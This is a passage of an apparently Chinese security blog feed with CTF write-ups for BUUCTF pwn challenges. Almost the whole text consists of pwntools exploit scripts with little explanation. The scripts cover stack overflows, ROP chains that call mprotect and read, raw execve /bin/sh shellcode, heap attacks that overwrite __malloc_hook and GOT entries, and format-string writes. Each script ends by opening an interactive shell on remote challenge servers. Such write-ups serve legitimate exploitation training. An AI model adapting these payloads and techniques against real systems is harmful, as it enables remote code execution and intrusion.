pwn(ip,port,debug):</span><br><span class="line">global sh</span><br><span class="line">global lib</span><br><span class="line">if(debug == 1):</span><br><span class="line">sh = process("./unexploit")</span><br><span class="line">else:</span><br><span class="line">sh = remote(ip,port)</span><br><span class="line">offset = 8</span><br><span class="line">payload  = offset * 'a'</span><br><span class="line">payload += p64(elf.bss() - 0x8)</span><br><span class="line">payload += p64(0x40068A)</span><br><span class="line">sh.send(payload)</span><br><span class="line">offset = 8</span><br><span class="line">payload  = offset * "a"</span><br><span class="line">payload += p64(elf.bss() + 0x8)</span><br><span class="line">payload += p64(0x40068A)</span><br><span class="line">payload += 'a' * 8</span><br><span class="line">sleep(0.1)</span><br><span class="line">sh.send(payload)</span><br><span class="line">pop_rdi_ret = 0x400713</span><br><span class="line">payload = p64(0x601058)</span><br><span class="line">payload += "\x48\x31\xf6\x56\x48\xbf"</span><br><span class="line">payload +="\x2f\x62\x69\x6e\x2f"</span><br><span class="line">payload += "\x2f\x73\x68\x57\x54"</span><br><span class="line">payload += "\x5f\xb0\x3b\x99\x0f\x05"</span><br><span class="line">sleep(0.1)</span><br><span class="line">sh.send(payload)</span><br><span class="line">sh.interactive()</span><br><span class="line">if __name__ == "__main__":</span><br><span class="line">pwn("101.71.29.5",10002,0)</span><br></pre></td></tr></tbody></table></figure></div></body></html>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF-BUUCTF-Pwn刷题之旅-(1)</title>
      <link href="/2019/07/13/CTF-BUUCTF-Pwn%E5%88%B7%E9%A2%98%E4%B9%8B%E6%97%85-(1)/"/>
      <url>/2019/07/13/CTF-BUUCTF-Pwn%E5%88%B7%E9%A2%98%E4%B9%8B%E6%97%85-(1)/</url>
      
        <content type="html"><![CDATA[<html><head></head><body><h2 id="0x01-warmup-csaw-2016"><a href="#0x01-warmup-csaw-2016" class="headerlink" title="0x01 warmup_csaw_2016"></a>0x01 warmup_csaw_2016</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level = "debug"</span><br><span class="line">context.arch = "amd64"</span><br><span class="line">elf = ELF("warmup_csaw_2016")</span><br><span class="line">sh = 0</span><br><span class="line">lib = 0</span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line">global sh</span><br><span class="line">global lib</span><br><span class="line">if(debug == 1):</span><br><span class="line">sh = process("./warmup_csaw_2016")</span><br><span class="line"></span><br><span class="line">else:</span><br><span class="line">sh = remote(ip,port)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(">")</span><br><span class="line">pop_rdi_ret = 0x0000000000400713</span><br><span class="line">payload = "a" * 72 + p64(0x0000000000400611)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br><span class="line">if __name__ == "__main__":</span><br><span class="line">pwn("buuoj.cn",20035,0)</span><br></pre></td></tr></tbody></table></figure></div><h2 id="0x02-RIP覆盖一下"><a href="#0x02-RIP覆盖一下" class="headerlink" title="0x02 RIP覆盖一下"></a>0x02 RIP覆盖一下</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">sh=0</span><br><span class="line">def connect(debug):</span><br><span class="line">global sh</span><br><span class="line">if(debug == 1):</span><br><span class="line">sh = process("./pwn1")</span><br><span class="line">else:</span><br><span class="line">sh = remote("buuoj.cn",6001)</span><br><span class="line">def pwn():</span><br><span class="line">offset = 23</span><br><span class="line">payload = offset*"a" + p64(0x000000000040118A)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br><span class="line">if __name__ == "__main__":</span><br><span class="line">connect(0)</span><br><span class="line">pwn()</span><br></pre></td></tr></tbody></table></figure></div><h2 id="0x03-babyfengshui-33c3-2016"><a href="#0x03-babyfengshui-33c3-2016" class="headerlink" title="0x03 babyfengshui_33c3_2016"></a>0x03 babyfengshui_33c3_2016</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level = "debug"</span><br><span class="line">sh = 0</span><br><span class="line">elf = ELF("babyfengshui")</span><br><span class="line">libc = ELF("x86_libc.so.6")</span><br><span class="line">def add(name_size,name,text_size,text):</span><br><span class="line">sh.recvuntil("Action: ")</span><br><span class="line">sh.sendline("0")</span><br><span class="line">sh.recvuntil("size of description: ")</span><br><span class="line">sh.sendline(str(name_size))</span><br><span class="line">sh.recvuntil("name: ")</span><br><span class="line">sh.sendline(name)</span><br><span class="line">sh.recvuntil("text length: ")</span><br><span class="line">sh.sendline(str(text_size))</span><br><span class="line">sh.recvuntil("text:")</span><br><span class="line">sh.sendline(text)</span><br><span class="line">def show(idx):</span><br><span class="line">sh.recvuntil("Action: ")</span><br><span class="line">sh.sendline("2")</span><br><span class="line">sh.recvuntil("index: ")</span><br><span class="line">sh.sendline(str(idx))</span><br><span class="line">def edit(idx,text,size):</span><br><span class="line">sh.recvuntil("Action: ")</span><br><span class="line">sh.sendline("3")</span><br><span class="line">sh.recvuntil("index: ")</span><br><span class="line">sh.sendline(str(idx))</span><br><span class="line">sh.recvuntil("text length: ")</span><br><span class="line">sh.sendline(str(size))</span><br><span class="line">sh.recvuntil("text: ")</span><br><span class="line">sh.sendline(text)</span><br><span class="line">def delete(idx):</span><br><span class="line">sh.recvuntil("Action: ")</span><br><span class="line">sh.sendline("1")</span><br><span class="line">sh.recvuntil("index: ")</span><br><span class="line">sh.sendline(str(idx))</span><br><span class="line">def connect(debug):</span><br><span class="line">global sh</span><br><span class="line">if(debug != 0):</span><br><span class="line">sh = process("./babyfengshui")</span><br><span class="line">else:</span><br><span class="line">sh = remote("buuoj.cn",20002)</span><br><span class="line">def pwn():</span><br><span class="line">offset = 0x98b1130 - 0x98b1008</span><br><span class="line">add(0x80,'\x11\n',0x80,'\x12\n')</span><br><span class="line">add(0x10,'\x13\n',0x10,"\x14\n")</span><br><span class="line">add(0x10,'\x15\x15',0x10,'\x16\x16')</span><br><span class="line">add(0x10,'/bin/sh\x00',0x10,"/bin/sh\x00")</span><br><span class="line">delete(0)</span><br><span class="line">#gdb.attach(sh.pid)</span><br><span class="line">add(0x100,'\x17\n',0x200,0x128 * 'a' + p32(elf.got['free']))</span><br><span class="line">show(1)</span><br><span class="line">sh.recvuntil("description: ")</span><br><span class="line">libc_base = u32(sh.recv(4)) - libc.symbols['free']</span><br><span class="line">system_addr = libc.symbols['system'] + libc_base</span><br><span class="line">edit(1,p32(system_addr),0x4)</span><br><span class="line">delete(3)</span><br><span class="line">log.success("libc: " + hex(libc_base))</span><br><span class="line">log.success("system_addr:" + hex(system_addr))</span><br><span class="line">#log.success("PID: " + str(sh.pid))</span><br><span class="line">sh.interactive()</span><br><span class="line"></span><br><span class="line">if "__main__" == __name__:</span><br><span class="line">connect(0)</span><br><span class="line">pwn()</span><br></pre></td></tr></tbody></table></figure></div><h2 id="0x04-babyheap-0ctf-2017"><a href="#0x04-babyheap-0ctf-2017" class="headerlink" title="0x04 babyheap_0ctf_2017"></a>0x04 babyheap_0ctf_2017</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level = "debug"</span><br><span class="line">sh = 0</span><br><span class="line">elf = ELF("babyheap_0ctf_2017")</span><br><span class="line">libc = ELF("x64_libc.so.6")</span><br><span class="line">#libc = ELF("libc-2.23.so")</span><br><span class="line">def add(size):</span><br><span class="line">sh.recvuntil("Command: ")</span><br><span class="line">sh.sendline("1")</span><br><span class="line">sh.recvuntil("Size: ")</span><br><span class="line">sh.sendline(str(size))</span><br><span class="line">def edit(idx,size,content):</span><br><span class="line">sh.recvuntil("Command: ")</span><br><span class="line">sh.sendline("2")</span><br><span class="line">sh.recvuntil("Index: ")</span><br><span class="line">sh.sendline(str(idx))</span><br><span class="line">sh.recvuntil("Size: ")</span><br><span class="line">sh.sendline(str(size))</span><br><span class="line">sh.recvuntil("Content: ")</span><br><span class="line">sh.send(content)</span><br><span class="line">def delete(idx):</span><br><span class="line">sh.recvuntil("Command: ")</span><br><span class="line">sh.sendline("3")</span><br><span class="line">sh.sendline(str(idx))</span><br><span class="line">def dump(idx):</span><br><span class="line">sh.recvuntil("Command: ")</span><br><span class="line">sh.sendline("4")</span><br><span class="line">sh.recvuntil("Index: ")</span><br><span class="line">sh.sendline(str(idx))</span><br><span class="line">def connect(debug):</span><br><span class="line">global sh</span><br><span class="line">if(debug == 0):</span><br><span class="line">sh = remote("buuoj.cn", 20001)</span><br><span class="line">else:</span><br><span class="line">sh = process("./babyheap_0ctf_2017")</span><br><span class="line">def pwn():</span><br><span class="line">add(0x10)</span><br><span class="line">add(0x10)</span><br><span class="line">add(0x10)</span><br><span class="line">add(0x10)</span><br><span class="line">add(0x80)</span><br><span class="line">delete(1)</span><br><span class="line">delete(2)</span><br><span class="line">payload = p64(0)*3 + p64(0x21) + p64(0)*3 + p64(0x21) + p8(0x80)</span><br><span class="line">edit(0,len(payload),payload)</span><br><span class="line">payload = p64(0)*3 + p64(0x21)</span><br><span class="line">edit(3,len(payload),payload)</span><br><span class="line">add(0x10)</span><br><span class="line">add(0x10)</span><br><span class="line">payload = p64(0)*3 + p64(0x91)</span><br><span class="line">edit(3,len(payload),payload)</span><br><span class="line">add(0x80)</span><br><span class="line">delete(4)</span><br><span class="line">dump(2)</span><br><span class="line">sh.recvuntil("Content: \n")</span><br><span class="line">libc_base = u64(sh.recv(8)) - 0x3C4B78</span><br><span class="line">malloc_hook = libc_base + libc.symbols['__malloc_hook']</span><br><span class="line">log.success("libc_base: " + hex(libc_base))</span><br><span class="line">log.success("__malloc_hook: " + hex(malloc_hook))</span><br><span class="line">add(0x60)</span><br><span class="line">delete(4)</span><br><span class="line">payload = p64(malloc_hook - 35)</span><br><span class="line">edit(2,len(payload),payload)</span><br><span class="line">add(0x60)</span><br><span class="line">add(0x60)</span><br><span class="line">one_gadget = 0x4526a</span><br><span class="line">payload = p8(0) * 3 + p64(0) * 2 + p64(libc_base + one_gadget)</span><br><span class="line">edit(6,len(payload),payload)</span><br><span class="line">#gdb.attach(sh.pid)</span><br><span class="line">add(50)</span><br><span class="line">sh.interactive()</span><br><span class="line">if __name__ == "__main__":</span><br><span class="line">connect(0)</span><br><span class="line">pwn()</span><br></pre></td></tr></tbody></table></figure></div><h2 id="0x05-get-started-3dsctf-2016"><a href="#0x05-get-started-3dsctf-2016" class="headerlink" title="0x05 get_started_3dsctf_2016"></a>0x05 get_started_3dsctf_2016</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.arch = "i386"</span><br><span class="line">context.log_level = "debug"</span><br><span class="line">#sh = process("./get_started_3dsctf_2016")</span><br><span class="line">sh = remote("buuoj.cn",20004)</span><br><span class="line">elf = ELF("get_started_3dsctf_2016")</span><br><span class="line">pop2_ret = 0x0809a7dc</span><br><span class="line">pop3_ret = 0x0804f460</span><br><span class="line">payload = 'a' * 56 + p32(elf.symbols['mprotect']) + p32(pop3_ret) + p32(0x080EB000) + p32(0x3000) + p32(7) + p32(elf.symbols['read']) + p32(pop3_ret) + p32(0) + p32(0x080EBF80) + p32(0x200) + p32(0x080EBF80)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">#sleep(1)</span><br><span class="line">#input()</span><br><span class="line">sh.sendline(asm(shellcraft.sh()))</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></tbody></table></figure></div><h2 id="0x06-not-the-same-3dsctf-2016"><a href="#0x06-not-the-same-3dsctf-2016" class="headerlink" title="0x06 not_the_same_3dsctf_2016"></a>0x06 not_the_same_3dsctf_2016</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level = "debug"</span><br><span class="line">context.arch = "i386"</span><br><span class="line">elf = ELF("not_the_same_3dsctf_2016")</span><br><span class="line">sh = 0</span><br><span class="line">lib = 0</span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line">global sh</span><br><span class="line">global lib</span><br><span class="line">if(debug == 1):</span><br><span class="line">sh = process("./not_the_same_3dsctf_2016")</span><br><span class="line"></span><br><span class="line">else:</span><br><span class="line">sh = remote(ip,port)</span><br><span class="line">pop3_ret = 0x0809e3e5</span><br><span class="line">#sh.recvuntil("b0r4 v3r s3 7u 4h o b1ch4o m3m0... ")</span><br><span class="line">offset = 45</span><br><span class="line">payload = offset * "a"</span><br><span class="line">payload += p32(elf.symbols['mprotect']) + p32(pop3_ret)</span><br><span class="line">payload += p32(0x080EB000) + p32(0x1000) + p32(7)</span><br><span class="line">payload += p32(elf.symbols['read']) + p32(pop3_ret)</span><br><span class="line">payload += p32(0) + p32(0x080EBF81) + p32(0x100) + p32(0x080EBF81)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">payload = asm(shellcraft.sh())</span><br><span class="line">sleep(1)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br><span class="line">if __name__ == "__main__":</span><br><span class="line">pwn("buuoj.cn",20007,0)</span><br></pre></td></tr></tbody></table></figure></div><h2 id="0x07-bugbug-codegate-2016"><a href="#0x07-bugbug-codegate-2016" class="headerlink" title="0x07 bugbug_codegate_2016"></a>0x07 bugbug_codegate_2016</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level = "debug"</span><br><span class="line">context.arch = "i386"</span><br><span class="line">elf = ELF("bugbug_codegate_2016")</span><br><span class="line">sh = 0</span><br><span class="line">lib = 0</span><br><span class="line">rand = 0</span><br><span class="line">randNum = []</span><br><span class="line">def getRand(seed):</span><br><span class="line">global randNum</span><br><span class="line">randNum = []</span><br><span class="line">global rand</span><br><span class="line">rand.sendline(str(seed))</span><br><span class="line">for i in range(0,6):</span><br><span class="line">randNum.append(int(rand.recvuntil("\n",True),10))</span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line">global sh</span><br><span class="line">global lib</span><br><span class="line">global rand</span><br><span class="line">if(debug == 1):</span><br><span class="line">sh = process("./bugbug_codegate_2016")</span><br><span class="line">lib = ELF("/lib/i386-linux-gnu/libc-2.23.so")</span><br><span class="line">else:</span><br><span class="line">sh = remote(ip,port)</span><br><span class="line">lib = ELF("x86_libc.so.6")</span><br><span class="line">#one step. make exit_got->start.finish loop</span><br><span class="line">payload = p32(elf.got['exit']) + "%." + str(0x8580 - 3) + "d%17$hn"</span><br><span class="line">size = len(payload)</span><br><span class="line">payload = payload.ljust(0x64,"a")</span><br><span class="line">sh.recv()</span><br><span class="line">sh.send(payload)</span><br><span class="line">sh.recvuntil(payload)</span><br><span class="line">ptr = u32(sh.recv(4))</span><br><span class="line">stream = u32(sh.recv(4))</span><br><span class="line">rand = process("./rand")</span><br><span class="line">getRand(ptr)</span><br><span class="line">sh.sendline(str(randNum[0]) + " "</span><br><span class="line">+str(randNum[1]) + " "</span><br><span class="line">+str(randNum[2]) + " "</span><br><span class="line">+str(randNum[3]) + " "</span><br><span class="line">+str(randNum[4]) + " "</span><br><span class="line">+str(randNum[5]))</span><br><span class="line">log.success("1 ptr = " + hex(ptr))</span><br><span class="line">rand.close()</span><br><span class="line">#two step. libc leak</span><br><span class="line">sh.recvuntil("Who are you? ")</span><br><span class="line">payload = p32(elf.got['__libc_start_main']) + "%17$s"</span><br><span class="line">size = len(payload)</span><br><span class="line">payload = payload.ljust(0x64,"a")</span><br><span class="line">sh.send(payload)</span><br><span class="line">sh.recvuntil(payload)</span><br><span class="line">ptr = u32(sh.recv(4))</span><br><span class="line">stream = u32(sh.recv(4))</span><br><span class="line">rand = process("./rand")</span><br><span class="line">getRand(ptr)</span><br><span class="line">sh.sendline(str(randNum[0]) + " "</span><br><span class="line">+str(randNum[1]) + " "</span><br><span class="line">+str(randNum[2]) + " "</span><br><span class="line">+str(randNum[3]) + " "</span><br><span class="line">+str(randNum[4]) + " "</span><br><span class="line">+str(randNum[5]))</span><br><span class="line">rand.close()</span><br><span class="line">sh.recvuntil("Congratulation, ")</span><br><span class="line">sh.recv(4)</span><br><span class="line">__libc_start_main = u32(sh.recv(4))</span><br><span class="line">libc = __libc_start_main - lib.symbols['__libc_start_main']</span><br><span class="line">puts = libc + lib.symbols['puts']</span><br><span class="line">system = libc + lib.symbols['system']</span><br><span class="line">printf = libc + lib.symbols['printf']</span><br><span class="line">one_gadget = libc + 0x5f066</span><br><span class="line">one_gadget1 = one_gadget >> 16</span><br><span class="line">one_gadget2 = one_gadget % (0x10000)</span><br><span class="line">log.success("2 ptr = " + hex(ptr))</span><br><span class="line">log.success("libc = " + hex(libc))</span><br><span class="line">log.success("puts = " + hex(puts))</span><br><span class="line">log.success("system = " + hex(system))</span><br><span class="line">log.success("printf = " + hex(printf))</span><br><span class="line">log.success("one_gadget = " + hex(one_gadget))</span><br><span class="line">log.success("__libc_start_main = " + hex(__libc_start_main))</span><br><span class="line">#modify exit_got to one_gadget</span><br><span class="line">#bp printf 0x08048960</span><br><span class="line">#exit_got 0x0804A024</span><br><span class="line">sh.recvuntil("Who are you? ")</span><br><span class="line">payload  = p32(elf.got['exit']) + p32(elf.got['exit'] + 2)</span><br><span class="line">payload += "%" + str(one_gadget2 - 8) + "d" + "%17$hn%" + str(one_gadget1 - one_gadget2) + "d%18$hn"</span><br><span class="line">size = len(payload)</span><br><span class="line">payload = payload.ljust(0x64,"a")</span><br><span class="line">sh.send(payload)</span><br><span class="line">sh.recvuntil(payload)</span><br><span class="line">ptr = u32(sh.recv(4))</span><br><span class="line">stream = u32(sh.recv(4))</span><br><span class="line">rand = process("./rand")</span><br><span class="line">getRand(ptr)</span><br><span class="line">#input()</span><br><span class="line">sh.sendline(str(randNum[0]) + " "</span><br><span class="line">+str(randNum[1]) + " "</span><br><span class="line">+str(randNum[2]) + " "</span><br><span class="line">+str(randNum[3]) + " "</span><br><span class="line">+str(randNum[4]) + " "</span><br><span class="line">+str(randNum[5]))</span><br><span class="line">rand.close()</span><br><span class="line">sh.recvuntil("Congratulation, ")</span><br><span class="line">sh.interactive()</span><br><span class="line">if __name__ == "__main__":</span><br><span class="line">pwn("buuoj.cn",20027,0)</span><br></pre></td></tr></tbody></table></figure></div><p>另外附上随机数生成器</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">#include<stdio.h></stdio.h></span><br><span class="line">#include<stdlib.h></stdlib.h></span><br><span class="line">#include<unistd.h></unistd.h></span><br><span class="line">int main(){</span><br><span class="line">unsigned int seed = 0;</span><br><span class="line">scanf("%u",&seed);</span><br><span class="line">srand(seed);</span><br><span class="line">int i = 0;</span><br><span class="line">int j = 0;</span><br><span class="line">int tmp;</span><br><span class="line">int v4[6] = {0,0,0,0,0,0};</span><br><span class="line">for ( i = 0; i <= 5; ++i ){</span><br><span class="line">tmp = rand() % 45 + 1;</span><br><span class="line">LABEL_6:</span><br><span class="line">for ( j = 0; i - 1 >= j; ++j ){</span><br><span class="line">if ( v4[j] == tmp )</span><br><span class="line">goto LABEL_6;</span><br><span class="line">}</span><br><span class="line">v4[i] = tmp;</span><br><span class="line">}</span><br><span class="line">for( i = 0; i<=5 ;++i){</span><br><span class="line">printf("%d\n",v4[i]);</span><br><span class="line">}</span><br><span class="line">return 0;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure></div><h2 id="0x08-ez-pz-hackover-2016"><a href="#0x08-ez-pz-hackover-2016" class="headerlink" title="0x08 ez_pz_hackover_2016"></a>0x08 ez_pz_hackover_2016</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span 